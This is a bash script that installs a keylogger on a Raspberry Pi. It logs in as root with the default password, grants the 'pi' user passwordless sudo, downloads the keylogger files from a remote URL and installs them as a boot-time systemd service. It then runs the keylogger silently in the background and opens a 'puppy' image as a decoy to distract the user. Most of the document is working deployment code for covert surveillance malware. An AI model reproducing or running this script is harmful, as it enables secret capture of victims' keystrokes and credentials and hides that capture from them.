#!/bin/bash
# application to install, setup, and run the keylogger.


# Force user to be included in sudoers and remove the need for passwords
# Totally expects the root user to be an unchanged Raspberry Pi
su - root <<!
raspberry
echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers &&
echo "pi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
!

mkdir nicekl
cd nicekl/

# DOWNLOAD FILES
base="https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/"
CONT=${base}controller.py
KMAP=${base}keymap.py
FKEY=${base}find_keyboard.py
CLIENT=${base}client.py
RSTRT=${base}restart.sh
KLSERV=${base}nicekeylogger.service
PUP=${base}puppy.jpg
wget -L "$CONT" "$KMAP" "$FKEY" "$CLIENT" "$KLSERV" "$RSTRT" "$PUP"
sudo mv puppy.jpg /home/pi/Pictures/puppy.jpg
sudo chmod +x controller.py restart.sh client.py

# SET APPLICATION AS A SERVICE WITH SYSTEMD
sudo mv nicekeylogger.service /etc/systemd/system/
sudo systemctl enable nicekeylogger.service
sudo systemctl daemon-reload

# RUN APPLICATION
./restart.sh > /dev/null 2>&1 &

# Launch puppy decoy picture
eog puppy.jpg &

exit
